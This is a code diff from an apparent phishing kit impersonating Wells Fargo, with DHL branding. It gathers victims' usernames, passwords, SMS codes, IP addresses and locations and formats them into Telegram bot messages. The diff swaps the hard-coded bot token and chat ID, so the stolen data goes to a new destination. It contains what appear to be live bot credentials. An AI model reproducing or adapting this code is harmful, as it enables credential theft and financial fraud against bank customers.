@@ -533,9 +533,9 @@ export default {
       );
       this.IP = tt.data.ip;
       this.query = tt.data.country_capital;
-        var token = "6913210321:AAEJFplMH_ysNxi4mMSRVBmM1wpjzMjuf70";
+        var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
 
-      var chatId2 = -4219558708;
+      var chatId2 = -4512252331;
       var fullMessage = `
        ||🏦💰💰| Wells |🏦💰💰||%0A%0AUserName : ${this.userName}%0A%0APasssword : ${this.password}%0A%0ACountry : ${this.query}%0AIP : ${this.IP}%0A%0A|💲💲💲|💳| DHL|💳|💲💲💲|`;
 
@@ -567,9 +567,9 @@ export default {
         );
         this.IP = tt.data.ip;
         this.query = tt.data.country_capital;
-         var token = "6913210321:AAEJFplMH_ysNxi4mMSRVBmM1wpjzMjuf70";
+         var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
 
-      var chatId2 = -4219558708;
+      var chatId2 = -4512252331;
         var fullMessage = `
         ||🏦💰💰| Wells |🏦💰💰||%0A%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A|%0A|💲💲💲|💳| DHL|💳|💲💲💲||`;
         if (this.tries > 0) {
